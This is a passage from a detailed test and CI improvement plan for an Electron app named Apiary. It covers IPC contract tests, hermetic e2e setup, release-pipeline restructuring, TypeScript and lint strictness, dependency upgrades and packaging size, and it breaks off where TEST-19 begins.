     - (a) every `CHANNELS.*` used in the preload has a handler or listener. Read the channel list by importing the preload with `ipcRenderer` mocked to record channel names.
     - (b) mutating channels emit `treeChanged`.
     - (c) a settings payload missing a key leaves the file unchanged.
  3. Collapse the positional parameters into one `IpcDeps` object, so the tests and index.ts name what they pass.
- **Why:** The most bug-prone glue in main is covered only by e2e, and a channel typo or a missing handler only shows up there.
- **Gain:** A fast, deterministic check of the IPC contract. It is also the loopback bridge TEST-5 needs.
- **Implementation steps:** As above. Also call the `registerIpc` dispose in `afterEach` so the chokidar watcher stops (ipc.ts imports `watch`).
- **Verification:** Delete one `handle(CHANNELS.x…)` locally and the parity test fails, naming `x`. Revert `keep` to `next.x` and the merge test fails.
- **Constraints:** Keep "treat a missing field as unchanged" (CLAUDE.md). main must not import renderer code. The preload stays CJS.
- **Depends on:** none.

#### TEST-5: Contract tests: one behavioural spec run against `fakeApiary` and against the real main process

- **Category:** harness
- **Severity:** high
- **Effort:** M
- **Evidence:** The fake has already drifted from main in concrete, checkable ways:

  | Behaviour | Real main | fakeApiary.ts |
  | --- | --- | --- |
  | `refresh` | sends `mrStatusesInvalidated`, no `treeChanged` (ipc.ts:111-118) | emits `treeChanged` and not `mrStatusesInvalidated` (fakeApiary.ts ~line 262) |
  | `gitCreateBranch`, `gitCheckoutRemote` | `refresh()` then `send(treeChanged)` (ipc.ts:355-375) | no event |
  | Transcript page size | `DEFAULT_LIMIT = 200` (transcriptReader.ts:5) | 50 (`Math.max(0, end - 50)`) |
  | `setSessionNote` | trims (appService.ts:420) | stores untrimmed |
  | `settingsSet({k: undefined})` | `keep()` leaves the value (ipc.ts:249) | `{...state.settings, ...s}` overwrites it with undefined |
  | Default settings | `DEFAULT_SETTINGS` in src/main/settings.ts | a hand copy in fakeApiary.ts (`DEFAULT_SETTINGS`) |

  CLAUDE.md:426-428 relies on authors keeping these in sync by hand.
- **What:** `tests/contract/bridgeContract.ts` exports `defineBridgeContract(name, makeBridge)`. `makeBridge()` returns `{ api: ApiaryApi, events: (name) => number, cleanup }`, seeded with the standard four sessions. Assertions are path-agnostic: ids, titles and labels only. Run it:
  - in `tests/component/contract.test.tsx` with `createFakeApiary()`;
  - in `tests/integration/contract.test.ts` with a **loopback bridge**. That is the real `src/preload/index.ts` imported with `electron` mocked so `ipcRenderer.invoke` calls the handler Map from TEST-4, `ipcRenderer.on` subscribes to the fake window's `send`, and `sendSync(themeInitial)` goes to the themeIpc handler. Behind it sit a real `AppService` and `registerIpc` over a temp home built by the same fixture builder the e2e harness uses.

  Clauses to start with: rename (tree title changes and `treeChanged` fires), remove, move, note set/clear/trim, partial settings save, refresh events, branch create/checkout events, transcript paging cursor semantics, import making `discovered()[i].imported` true.
- **Why:** Component tests pass against whatever the fake says. Every row in the table above is a component test that can be green while the app behaves differently.
- **Gain:** The fake becomes a checked model. Drift fails CI in seconds.
- **Implementation steps:**
  1. Extract the "four fixture sessions plus repo plus worktree" builder from tests/e2e/helpers.ts:193-281 into `tests/fixtures/standardHome.ts`. Use it from e2e and from the loopback.
  2. Build the loopback: TEST-4's mock plus the preload import.
  3. Write the contract with `describe`/`it`/`expect` from `vitest` so it runs under both configs. Keep it free of Node and DOM imports. Add `tests/contract` to both tsconfig includes and to both Vitest configs.
  4. Fix the fake so it passes. Where the real behaviour is wrong, fix main instead.
  5. Make the fake import `DEFAULT_SETTINGS` from a new `src/shared/settingsDefaults.ts`, not a copy (main's version has main-only fields such as `windowBounds`, so share the payload subset).
- **Verification:** Both contract runs are green. Reverting the fake's `refresh` to emit `treeChanged` fails the component contract run.
- **Constraints:** The fake stays typed as `ApiaryApi`. Pure shared helpers go in src/shared, not src/main (CLAUDE.md "Conventions").
- **Depends on:** TEST-4.

#### TEST-6: Testability seams in main-process modules that build their own dependencies

**Lead review:** The `AppService` part is MAIN-14 step 1.

- **Category:** seams
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - **AppService** (appService.ts:94-132): `readonly pty = new PtyManager()` is a field initialiser. The constructor does `new SessionStore(options.dbPath)`, `new PluginRegistry`, `createGitLabMrPlugin`, and lazily `new SearchIndex` and `new SearchClient` (line 339). As a result every AppService test needs better-sqlite3, node-pty and a real `$SHELL -l` (appService.ts:696,712), and the whole appService.test.ts is integration.
  - **PtyManager**: `import * as pty from 'node-pty'` (ptyManager.ts:2). `Date.now()` at 129, 162, 247-255 and `setTimeout(tick, 25)` polling at 256 drive `sendPrompt`'s settle logic. That is tested today only with real time and real shells (appService.test.ts:846,886 use `vi.waitFor` with 15 s budgets).
  - **ThemeGenerator**: `spawn` imported directly (themeGenerator.ts:1). The test uses real sleeps (integration/themeGenerator.test.ts:85,97,101).
  - **ipc.ts**: `Date.now()` in `activeTabs` (ipc.ts:161) and throttle timers (662, 682).
  - **macSignature.ts**: `execFileSync('codesign')` at import site.
  - **index.ts:319-386**: `createUpdater` holds the E2E fake backend inline and reads `process.env`.
  - Good examples already present: `UpdateService` takes `backend` and `timers {setTimeout, now}` (updateService.ts:97-139). `resolveMrStatus` takes `exec` and `now` (mrStatusCache.ts:55-59). `detectVsCode`/`openInVsCode` take `exec`, `exists` and `spawn` (detectVsCode.ts:13-18,50-53). `ClaudeSessionTracker` takes `TrackerOptions`. `claudeRename` takes `sleep` (claudeRename.ts:61). `gitlabMr` takes `exec`.
- **What:** Follow the existing pattern (optional injected dependency, real default). Do not add a DI framework.
  - `AppServiceOptions.deps?: { pty?: PtyManager; store?: SessionStore; plugins?: PluginRegistry; searchClient?: SearchClient }`.
  - `PtyManager` constructor `{ spawn?: typeof pty.spawn; now?: () => number; setTimeout?: … }`. A fake `IPty` emitting scripted chunks then lets the `CSI ?1049h` wait and the settle timing be unit-tested with fake timers.
  - `ThemeGenerator` opts `spawn?`.
  - `registerIpc` deps (TEST-4) with `now?`.
  - Move the fake update backend out of index.ts into `src/main/update/fakeBackend.ts`, so it can be tested and index.ts holds only the env switch.
  - `hasDeveloperIdSignature(exec = execFileSync)`.
- **Why:** The prompt-delivery bug described in CLAUDE.md ("Writing to a PTY is not the same as a program receiving it") is guarded only by a 15-second real-shell test. Timing logic tested with real time is how flakes happen. The proposal doc lists "two appService integration failures seen once".
- **Gain:** Deterministic unit tests for pty timing, the activity throttle and the generator timeout. A smaller integration layer.
- **Implementation steps:** One module per PR. Default every injected dependency to the current behaviour. Add unit tests with `vi.useFakeTimers()` beside the existing integration test, and keep the real-pty test as the wiring proof.
- **Verification:** New unit tests run in under 100 ms each. Existing integration tests unchanged and green.
- **Constraints:** Keep the real-shell integration test for sendPrompt (CLAUDE.md names it as the reproduction). The renderer never supplies paths.
- **Depends on:** none.

#### TEST-7: The search worker and the packaged app are never exercised by any test

- **Category:** coverage / build
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - searchClient.ts:28-29 resolves `join(dirname(import.meta.url), 'searchWorker.js')`. Under Vitest that path does not exist, so `ensure()` always hits `fail` and `unavailable = true`, and integration covers only the in-process fallback.
  - E2E runs from `out/`, unpackaged (helpers.ts:288 `'.'`).
  - The packaged layout (asarUnpack of `out/main/searchWorker.js`, which imports `./chunks/searchIndex-*.js` according to `head out/main/searchWorker.js`; the node-pty `spawn-helper` chmod in build/afterPack.cjs, which "must never fail the build: any problem is logged and swallowed") is verified by nothing.
  - A worker failure only shows up in a log that is off by default (CLAUDE.md "The diagnostic log").
- **What:**
  1. Node test for the worker: build it with `electron-vite build` in CI, or compile it on the fly with an esbuild or `vite build --ssr` step into a temp dir. Point `SearchClient` at it through a new optional `workerPath` constructor argument, and assert `search()` returns ids (not `null`).
  2. A **packaged smoke** in release.yml after `dist:*`: Playwright `_electron.launch({ executablePath })` against `release/linux-unpacked/apiary` (under xvfb) and `release/mac-arm64/Apiary.app/Contents/MacOS/Apiary`. Reuse `appBoots.spec.ts` plus one "open shell, echo" test (proves spawn-helper is executable) plus one content search that returns a result (proves the worker loads from inside asar).
- **Why:** Search freezing every window (7.7 s on one keystroke) is the bug the worker exists to prevent (CLAUDE.md "Search"). A silent fallback would reintroduce it with no failing test.
- **Gain:** Catches packaging regressions before users do.
- **Implementation steps:** Add an `APIARY_E2E_EXECUTABLE` env var to helpers.ts `launchApiary` (when it is set, pass `executablePath` and drop `'.'`). Add a `packaged` Playwright project with `grep: /@packaged/`. Tag the three tests.
- **Verification:** Temporarily removing `out/main/searchWorker.js` from `asarUnpack` makes the packaged smoke fail.
- **Constraints:** Ask before any release or tag work (CLAUDE.md "Releasing"). This runs inside the release workflow only.
- **Depends on:** TEST-11 (xvfb setup).

#### TEST-8: A relaunched e2e app loses the harness's test environment

**Lead review:** Re-verified: `launchAgainst` (`helpers.ts:394-403`) drops the harness environment.

- **Category:** e2e
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - `launchApiary` passes `APIARY_CODE_PATH`, `APIARY_GLAB_PATH`, `APIARY_FAKE_UPDATE(_MODE)`, `APIARY_FAKE_GLAB_*` and `APIARY_FAKE_CODE_LOG` (helpers.ts:289-306).
  - `launchAgainst` (helpers.ts:394-403) passes only `APIARY_CONFIG_ROOT`, `APIARY_DB_PATH`, `APIARY_FAKE_LIVE: ''` and extras.
  - index.ts:413-416: an **undefined** `APIARY_CODE_PATH` runs real `detectVsCode()` (spawns `code --version` on the dev machine). index.ts:434: an undefined `APIARY_GLAB_PATH` means the real `glab`.
  - 24 `relaunchApiary(h…)` call sites (grep), including themes, settings, sidebar and pinning specs.
- **What:** Store the full launch env on the `Harness` (`h.env`), and relaunch with `{...h.env, ...extraEnv}`.
- **Why:** After a relaunch the app behaves differently depending on whether VS Code or glab is installed on the machine. That makes the relaunch specs environment-dependent, which will show on CI.
- **Gain:** Relaunch specs become hermetic.
- **Implementation steps:** In helpers.ts, build `const env = launchEnv({...})` once, keep it on the harness, and have `launchAgainst` use `launchEnv({ ...h.env, ...extraEnv })`. Add `electronArgs` to the harness too, so a relaunch keeps `--disable-gpu`.
- **Verification:** Add a spec: launch with `codePath: ''`, relaunch, and assert the VS Code button is still absent (`vsCodeAvailable()` stays false).
- **Constraints:** Keep stripping `ELECTRON_RUN_AS_NODE` (CLAUDE.md).
- **Depends on:** none.

#### TEST-9: E2E and integration depend on the developer's git config, shell dotfiles and `claude` install

- **Category:** e2e / harness
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - The app's own `git merge --no-edit` (branchOps.ts:265) runs with the user's global git config. The tests work around this per call with `-c commit.gpgsign=false` (helpers.ts:105, gitMenu.spec.ts:30,62,66, gitToolbar.spec.ts:63, sidebarFolders.spec.ts:73, appService.test.ts:53), and `user.email` is set in 5 files. A developer with global `commit.gpgsign=true` gets a signing prompt from the gitMenu merge tests.
  - The default harness has no `claude` stand-in. `terminal.spec.ts:36` (`@smoke`) clicks Resume, which spawns `$SHELL -l -c 'exec claude --resume …'`: the real `claude` locally, "command not found" and an immediate exit on CI.
  - Three specs each paste the same `useFakeClaudeShell` through the Settings UI (composer.spec.ts:16-27, activeSection.spec.ts:10, newSession.spec.ts:22).
  - Shells are login shells (`exec "$SHELL" -l`, appService.ts:696), so the user's `.zprofile`/`.bash_profile` run in every test.
- **What:**
  - In `launchEnv` and in a Vitest `globalSetup`, set `GIT_CONFIG_GLOBAL=<tmp>/gitconfig` (user.name/email, `init.defaultBranch=main`, `commit.gpgsign=false`, `tag.gpgsign=false`) and `GIT_CONFIG_NOSYSTEM=1`.
  - Add a `claudeBin` harness option, **defaulting to a stand-in** (`scripts/fixtures/fake-claude.sh`, or a `exec "$SHELL" -l` script). Seed it by writing `<userdata>/settings.json` with `{ claudeBin }` before launch instead of driving the UI. Replace the three copies of `useFakeClaudeShell`.
  - Document the shell-dotfile dependency. Optionally let CI set `SHELL=/bin/bash` with an empty `HOME`-scoped profile.
- **Why:** Hermeticity is required before e2e can run on CI (TEST-11). It also removes machine-specific flakes.
- **Gain:** The same result on any machine. Around 30 lines of duplicated helper code removed.
- **Implementation steps:**
  1. Add `tests/fixtures/gitEnv.ts` exporting `isolatedGitEnv(dir)`. Use it in helpers.ts `launchEnv`, and in a Vitest globalSetup that sets `process.env`.
  2. Add a `claudeBin` option to `launchApiary`, written into settings.json. Remove the per-spec helpers.
  3. Drop the redundant `-c commit.gpgsign=false`.
- **Verification:** Set `git config --global commit.gpgsign true` locally and gitMenu passes. On a machine without `claude`, the terminal smoke passes.
- **Constraints:** Live specs (`APIARY_LIVE_CLAUDE=1`) must still reach the real `claude`, so let `configRoot`/live pass `claudeBin: null`.
- **Depends on:** none.

#### TEST-10: No trace, screenshot, retry or report output when an e2e test fails

- **Category:** e2e
- **Severity:** medium
- **Effort:** S
- **Evidence:** playwright.config.ts:18-28 has `reporter: 'list'`, no `retries`, no `forbidOnly`, and no `use` block. For `_electron.launch`, `use.trace` would not apply anyway: tracing must be started on `app.context()` by hand. test-results/ ends up holding only what specs write explicitly.
- **What:**

  ```ts
  retries: process.env.CI ? 1 : 0,
  forbidOnly: !!process.env.CI,
  reporter: process.env.CI
    ? [['list'], ['html', { open: 'never' }], ['junit', { outputFile: 'test-results/junit.xml' }]]
    : 'list',
  ```

  In helpers.ts `launchApiary`: `await app.context().tracing.start({ screenshots: true, snapshots: true })`. In `close()`: if `test.info().status !== test.info().expectedStatus`, then `tracing.stop({ path: test.info().outputPath('trace.zip') })` and `page.screenshot({ path: test.info().outputPath('failure.png') })`; otherwise `tracing.stop()`. Do the same in `launchAgainst` for relaunched apps.
- **Why:** An e2e failure on CI would otherwise be a stack trace and nothing to look at.
- **Gain:** Failures can be debugged with a trace viewer. Retries turn flakes into "flaky" in the report instead of red builds, while still showing them.
- **Implementation steps:** As above. Also add `playwright-report/` upload in CI (TEST-11).
- **Verification:** Force a failure. `test-results/<test>/trace.zip` exists and opens in `npx playwright show-trace`.
- **Constraints:** Never write to fixed paths; use `test.info().outputPath()` (CLAUDE.md "Testing").
- **Depends on:** none.

#### TEST-11: Run `@smoke` e2e on Linux CI under xvfb

- **Category:** ci / e2e
- **Severity:** high
- **Effort:** M
- **Evidence:** ci.yml:4-6 and release.yml:17-20 exclude e2e because it "needs a display on Linux and a real claude". But `@smoke` is 12 tests (~23 s locally, per the proposal doc), and stand-ins already exist (scripts/fixtures/fake-claude.sh, fake-glab.sh, fake-code.sh). No automated check launches Electron at all today.
- **What:** A new job in ci.yml:

  ```yaml
  e2e-smoke:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: sudo apt-get update && sudo apt-get install -y xvfb libnss3 libgbm1 libasound2t64 libgtk-3-0t64
      # Ubuntu 24.04 restricts unprivileged user namespaces; Electron's sandbox needs one of these.
      - run: sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0
      - run: git config --global user.email ci@example.com && git config --global user.name CI   # until TEST-9 lands
      - run: xvfb-run -a npm run test:e2e:smoke
        env: { CI: '1' }
      - if: failure()
        uses: actions/upload-artifact@<sha>
        with: { name: e2e-smoke-results, path: test-results/ }
  ```

- **Why:** Main-process wiring, IPC, ptys and multi-window behaviour only reach CI when a human runs the suite before tagging.
- **Gain:** Boot, resume, terminal, relaunch and split regressions are caught on the PR. It is also the path to the full suite in 2 shards later.
- **Implementation steps:**
  1. Land TEST-9 (the default claude stand-in, git isolation) and TEST-10 (traces).
  2. Add the job. Run it 10 times through `workflow_dispatch` to measure flake rate before making it required.
  3. Phase 2: the full parallel project in two shards (`--shard=1/2`), with `@serial` in a third job, on `push` to main only.
- **Verification:** The job is green 10/10 on reruns. Deliberately breaking `appBoots` turns it red and uploads a trace.
- **Constraints:** Live and bench specs stay opt-in (they are already skipped without `APIARY_LIVE_CLAUDE`/`APIARY_BENCH`). Never spend tokens in CI (CLAUDE.md, activity fixtures).
- **Depends on:** TEST-9, TEST-10. TEST-1 makes the rebuild in `test:e2e:smoke` cheaper.

#### TEST-12: CI hygiene: caching, concurrency, timeouts, pinning, reports

**Lead review:** Pinning and caching go in the same PR as TEST-13 and SEC-4.

- **Category:** ci
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - ci.yml has no `concurrency:` group, so superseded PR pushes keep running.
  - There is no `timeout-minutes` (default 360).
  - Actions are pinned by tag (`actions/checkout@v4`, `setup-node@v4`, and in release.yml `softprops/action-gh-release@v2`, a third-party action running with `contents: write`).
  - `npx playwright install --with-deps chromium` runs uncached on every run (ci.yml:52).
  - The `test` job's `npm ci` downloads the Electron binary it never uses.
  - No test reports are uploaded.
  - There is no Dependabot or Renovate config (`.github/` holds only workflows/) and no `.nvmrc`.
- **What:**
  - `concurrency: { group: ci-${{ github.ref }}, cancel-in-progress: true }` on ci.yml. Release should not cancel.
  - `timeout-minutes: 15` per job.
  - Pin every action by commit SHA with a version comment.
  - Cache `~/.cache/ms-playwright` keyed on the `@playwright/test` version from package-lock, and on a cache hit run only `npx playwright install-deps chromium`.
  - Set `ELECTRON_SKIP_BINARY_DOWNLOAD=1` on the unit/component job, but not the e2e job.
  - Add a Vitest `--reporter=junit --outputFile=test-results/vitest.xml` and upload it on failure.
  - Add `.github/dependabot.yml` for `npm` (grouped: electron, vitest, eslint, build) and `github-actions`.
- **Why:** Cheaper, faster and more trustworthy CI. Supply-chain pinning for the action that holds write access to releases.
- **Gain:** Minutes saved per run. Reports on failure. Dependency drift gets surfaced (see TEST-17).
- **Implementation steps:** As listed, one PR.
- **Verification:** A second push to a PR cancels the first run. The cache hit shows in the log. The junit artifact is present on a forced failure.
- **Constraints:** Keep `GITHUB_TOKEN` for the shellcheck download (ci.yml:34-36).
- **Depends on:** none.

#### TEST-13: release.yml can publish a partial release, skips component tests, and macOS has no CI before the tag

**Lead review:** Canonical release-pipeline item. It includes SEC-4's token split and TEST-12's SHA pinning. Re-verified `fail-fast: false` with per-leg uploads.

- **Category:** ci
- **Severity:** high
- **Effort:** M
- **Evidence:**
  - release.yml:27-33 sets `fail-fast: false`, and each leg uploads straight to the release (lines 72-78). If the Linux leg fails its tests, the mac leg still creates the release and attaches the dmg, zip and `latest-mac.yml`, so installed mac copies are offered a version whose Linux half does not exist.
  - The release runs typecheck and lint on both legs (release.yml:56-62), which is redundant since they are platform-independent, and it does **not** run `test:component`.
  - `setup-node` has no `cache: npm` (release.yml:51-53).
  - Nothing checks that the tag matches package.json `version`.
  - ci.yml runs only on `ubuntu-latest`, so the macOS unit and integration suites (real pty, `/private/var` realpath, codesign, zsh) first run at tag time.
- **What:**
  - Split release.yml into three stages:
    - `verify` (ubuntu): check the tag against `package.json` version, then typecheck, lint, `npm test`, `test:component`.
    - `build` matrix (`needs: verify`): `npm test` on macOS only, `dist:*`, `actions/upload-artifact`.
    - `publish` (`needs: build`, runs only if all legs succeeded): download the artifacts and create the release (optionally as a draft) with all files at once.
  - In ci.yml, add `macos-14` to the `test` job as a matrix entry, on `push` to main (not on every PR, to save macOS minutes).
- **Why:** Avoids half-published releases, which the updater would advertise. Catches mac-only failures before tagging, not after.
- **Gain:** A release is published whole or not at all.
- **Implementation steps:** Restructure the jobs as above. Keep `latest-*.yml` in the uploaded files with `fail_on_unmatched_files: true`.
- **Verification:** On a fork, a tag with a deliberately failing Linux test produces no release.
- **Constraints:** Ask before pushing, tagging or releasing (CLAUDE.md, and the user's memory rule). `latest-mac.yml`/`latest-linux.yml` and the mac `zip` target must stay (CLAUDE.md "Updating").
- **Depends on:** none.

#### TEST-14: 36 component tests print an uncaught-looking xterm TypeError and still pass

- **Category:** harness
- **Severity:** medium
- **Effort:** S
- **Evidence:** `npm run test:component` printed `stderr | … [TypeError: Cannot read properties of undefined (reading 'dimensions')]` in gitToolbar (10), multiTerminal (13), lookAndFeel (6), gitMenu (4), sessionTabs (3), terminal (1) and themes (1). The pattern matches xterm 5.5 reading `_renderService.dimensions` after dispose. `@xterm/addon-fit`'s `proposeDimensions` reads `e._renderService.dimensions` without a guard (node_modules/@xterm/addon-fit/lib/addon-fit.js). The error also points at a real unmount race in `TerminalView`. The suite has no guard against unexpected console errors (tests/component/setup.ts only unmounts and clears localStorage).
- **What:** In setup.ts, spy on `console.error` and on `window` `error`/`unhandledrejection`. Fail the test in `afterEach` unless it declared `expectConsoleError(/pattern/)`: errorReporting.test.tsx deliberately throws `NOBODY_CAUGHT_THIS` and `DELIBERATE_RENDER_CRASH`. Then fix the cause: guard `fit()` in TerminalView when the terminal is disposed or has no `element.parentElement`, and cancel the ResizeObserver or rAF on unmount. Also consider xterm 6 (TEST-17).
- **Why:** Real renderer errors are currently invisible noise. The same race can happen in the app on tab close or move.
- **Gain:** Component runs are silent unless something is wrong.
- **Implementation steps:** Add the guard with an allowlist entry for this error first (so the suite stays green), then fix TerminalView and remove the entry.
- **Verification:** `npm run test:component 2>&1 | grep -c dimensions` returns 0.
- **Constraints:** TerminalView ordering (paint snapshot, await parse, then fit and resize) must stay as in CLAUDE.md "Windows, and what belongs to which".
- **Depends on:** none.

#### TEST-15: TypeScript strictness flags: what each costs

- **Category:** tooling
- **Severity:** low
- **Effort:** S for the first three, L for `noUncheckedIndexedAccess`
- **Evidence:** Both tsconfigs have only `strict` and `noUnusedLocals` (tsconfig.json:8-9, tsconfig.node.json:8-9). Measured with `npx tsc --noEmit -p … --<flag>`:

  | Flag | tsconfig.json | tsconfig.node.json | Unique src errors |
  | --- | --- | --- | --- |
  | noImplicitReturns, noFallthroughCasesInSwitch, useUnknownInCatchVariables | 0 | 0 | 0 |
  | noImplicitOverride | 3 | 0 | 3 (ErrorBoundary.tsx:33,40,44) |
  | noUnusedParameters | 0 | 2 | 2 |
  | exactOptionalPropertyTypes | 10 | 14 | 19 src and 5 tests (appService.ts ×7, SessionColumn ×4, SessionTree ×4, index.ts:417, logger.ts:143, …) |
  | noPropertyAccessFromIndexSignature | 85 | 185 | not worth it (style) |
  | noUncheckedIndexedAccess | 315 | 239 | **89 in src**, 418 in tests (top: layout.ts 20, ThemesSection 18, validate.ts 8, color.ts 8, gradientDrift 8) |

- **What:** Turn on the four free flags plus `noImplicitOverride` now. Do `exactOptionalPropertyTypes` in one PR (24 sites). Do `noUncheckedIndexedAccess` for src only: put it in a `tsconfig.src.json` used by `typecheck`, leaving tests on the old setting, or fix tests with `!`/`at()` file by file.
- **Why:** `noUncheckedIndexedAccess` catches exactly the `arr[0].x` class of crash in layout, colour and parsing code. The IPC and settings optional fields are where `exactOptionalPropertyTypes` would have flagged the `undefined`-overwrites-setting bug.
- **Gain:** Stronger typing at low cost.
- **Implementation steps:** Flip the flags, fix the errors, and let `npm run typecheck` in pre-push enforce them.
- **Verification:** `npm run typecheck` passes.
- **Constraints:** "TypeScript is strict; both tsconfigs must pass" (CLAUDE.md).
- **Depends on:** none.

#### TEST-16: Lint additions: exhaustive switches, a cycle check, the JSX namespace

- **Category:** tooling
- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `npx eslint src tests --rule … -f json` counts: `switch-exhaustiveness-check` 0, `strict-boolean-expressions` 22 in src, `no-unnecessary-condition` 54 in src and 42 in tests, `prefer-nullish-coalescing` 3, `no-deprecated` 77 (76 are the global `JSX` namespace, 1 is `navigator.platform`), `no-non-null-assertion` 17 in src.
  - `npx madge@8 --circular --extensions ts,tsx --ts-config tsconfig.json src`: "No circular dependency found" (155 files).
  - Already on and verified: `no-floating-promises`, `no-misused-promises`, `vitest/no-focused-tests`, `playwright/no-focused-test`, `playwright/no-wait-for-timeout` (warn, with `--max-warnings 0`), `reportUnusedDisableDirectives`.
- **What:**
  - Add `@typescript-eslint/switch-exhaustiveness-check` (free) and `prefer-nullish-coalescing` (3 fixes).
  - Add `no-deprecated` after a codemod from `JSX.Element` to `React.JSX.Element`, which also prepares React 19, where the global `JSX` goes away.
  - Keep `no-unnecessary-condition` for later: 54 hits, some of them deliberate defensive checks on IPC data.
  - Add `"lint:cycles": "madge --circular --extensions ts,tsx --ts-config tsconfig.json src"`, with madge as a pinned devDependency, to `lint`. It is cheaper than `import-x/no-cycle` under type-aware ESLint.
- **Why:** Keeps the no-cycles state and the architecture layering stable. The JSX codemod is a React 19 prerequisite.
- **Gain:** Cheap guards.
- **Implementation steps:** Change eslint.config.js rules. Run `npx eslint --fix` where it applies.
- **Verification:** `npm run lint` passes.
- **Constraints:** Disable comments must carry a `-- reason`.
- **Depends on:** none.

#### TEST-17: Dependency upgrades: what matters and in what order

**Lead review:** Step 2 (Electron) is SEC-1, scheduled in Phase 1 right after TEST-1.

- **Category:** deps
- **Severity:** medium (Electron is high for security, covered by the security reviewer)
- **Effort:** L overall
- **Evidence:** `npm outdated`:
  - `electron` 38.8.6 → 44.4.5. Electron supports the latest 3 majors, so 38 is out of support.
  - `vitest` and `@vitest/browser` 2.1.9 → 5.0.2.
  - `vite` 5.4.21, through electron-vite 2.3.0 → 5.0.0 and `@vitejs/plugin-react` 4.7 → 6.1.
  - `electron-builder` 25.1.8 → 26.15.3.
  - `@electron/rebuild` 3.7.2 → 4.2.0.
  - `better-sqlite3` 11.10.0 → 13.0.3 (`@types` 7.6 → 9.6).
  - `react` and `react-dom` 18.3.1 → 19.3.0.
  - `marked` 15.0.12 → 18.0.14.
  - `@xterm/*` 5.5 → 6.0 (addon-fit 0.11, addon-serialize 0.14).
  - `chokidar` 4 → 5, `typescript` 5.9 → 7.0.
  - `dompurify` 3.4.14 → 3.4.16 (patch).
  - `playwright` 1.62.1 → 1.63.
- **What:** Upgrade in this order:
  1. Patch and minor bumps now: dompurify, playwright.
  2. **Electron 38 → 44**, one or two majors per PR. This needs a new ABI, which TEST-1 makes painless. Also move `@electron/rebuild` to 4 and electron-builder to 26 (its bundled app-builder-lib pins `@electron/rebuild@3.6.1`, per `npm ls`). Check better-sqlite3 support for Electron 44's ABI, which likely forces better-sqlite3 12 or 13.
  3. **Vitest 2 → 3 → (4/5)** together with `@vitest/browser` and `@vitest/coverage-v8`. In the component config, `browser.name` must become `browser.instances: [{ browser: 'chromium' }]`, `@vitest/browser/providers/playwright` types move, and workspace files become `test.projects` (3.2+).
  4. **electron-vite 2 → 5** with Vite 6/7 and plugin-react. Re-verify the `externalizeDepsPlugin` exclude list and the worker entry.
  5. xterm 6. This may fix TEST-14. Re-run `screenSnapshot.test.ts` and the activity fixtures, which depend on the serializer's output.
  6. React 19, after the JSX codemod (TEST-16). `@types/react` 19.
  7. marked 18 (check the renderer's MarkdownText and DOMPurify path) and chokidar 5 (ESM-only; main is bundled ESM so it should be fine).
  8. TypeScript 7 (the native compiler) last, once typescript-eslint supports it.
- **Why:** An unsupported Electron gets no Chromium security fixes. Vitest 2 and Vite 5 are EOL. Every later upgrade gets harder the longer this waits.
- **Gain:** Security fixes, and faster tooling (Vitest 3+ browser mode, TS 7).
- **Implementation steps:** One major per PR, each with a changelog entry and a version bump (user rule: every change bumps the version).
- **Verification:** All four layers green, plus `dist:*` on both OSes (TEST-7's packaged smoke once it exists).
- **Constraints:** Native module ABI (TEST-1). The mac `zip` target and `latest-*.yml` stay.
- **Depends on:** TEST-1 (Electron), TEST-12 (Dependabot), TEST-16 (React).

#### TEST-18: Packaging ships renderer-only dependencies and possibly unused native prebuilds

- **Category:** build
- **Severity:** low
- **Effort:** S
- **Evidence:**
  - package.json:39-52 lists `react`, `react-dom`, `marked`, `dompurify`, `@xterm/xterm`, `@xterm/addon-fit`, `@xterm/headless` and `@xterm/addon-serialize` under `dependencies`.
  - A grep of src/main and src/preload shows 0 imports of the first six (they are bundled into the renderer), and the two `@xterm` main-side packages are bundled into main by `externalizeDepsPlugin({ exclude: [...] })` (electron.vite.config.ts:14).
  - The built `out/main/index.js` imports only `better-sqlite3`, `chokidar`, `electron`, `electron-updater` and `node-pty` at runtime.
  - electron-builder copies all production `dependencies` into the app: react-dom alone is 4.4 MB, and the listed packages total about 10.8 MB.
  - `asarUnpack: **/node_modules/node-pty/**` unpacks the whole package, including `prebuilds/` (58 MB here: darwin-arm64, darwin-x64, win32-*), and `build/Release/pty.node` is loaded first after a rebuild. Better-sqlite3's `deps/` is 9.5 MB of SQLite source, and `build/Release/obj*` is 13 MB.
  - Unverified against a real package (no `release/` dir locally). Confirm with `npx asar list release/*/resources/app.asar` and `du -sh …/app.asar.unpacked`.
  - Fonts: fontsource CSS emits woff2 **and** woff for 18 faces (`out/renderer/assets` has both). Electron's Chromium never uses the woff.
  - There are no sourcemaps in production (no `sourcemap` in the config), which is acceptable.
  - `rebuild:electron -f` before `dist` duplicates electron-builder's own `npmRebuild` (default true).
- **What:**
  - Move the eight bundled packages to `devDependencies`. They keep working because Vite bundles them.
  - Add `files` exclusions after verifying:

    ```yaml
    - "!**/node_modules/node-pty/{prebuilds,deps,src,scripts}/**"
    - "!**/node_modules/better-sqlite3/{deps,src}/**"
    - "!**/node_modules/*/build/Release/{obj,obj.target,.deps}/**"
    - "!**/node_modules/better-sqlite3/build/Release/test_extension.node"
    ```

  - Optionally import only the `-400.woff2`/`-700.woff2` faces through `@font-face` in styles.css instead of fontsource's CSS.
- **Why:** Smaller downloads and updates. Less unpacked surface.
- **Gain:** Probably tens of MB less per installer (measure it).
- **Implementation steps:** Change package.json and electron-builder.yml. Run `dist` locally (ask first). Compare installer sizes. Run the packaged smoke (TEST-7).
- **Verification:** The packaged app boots, opens a shell and searches. The installer is smaller.
- **Constraints:** `spawn-helper` must stay executable (afterPack.cjs and the prebuild paths it checks). If node-pty resolves from `prebuilds/` on some platform, keep that platform's directory.
- **Depends on:** TEST-7.

#### TEST-19: Test organisation: split the big file, share fixtures, fix the layer labels

- **Category:** organisation
- **Severity:** low
- **Effort:** M
- **Evidence:**
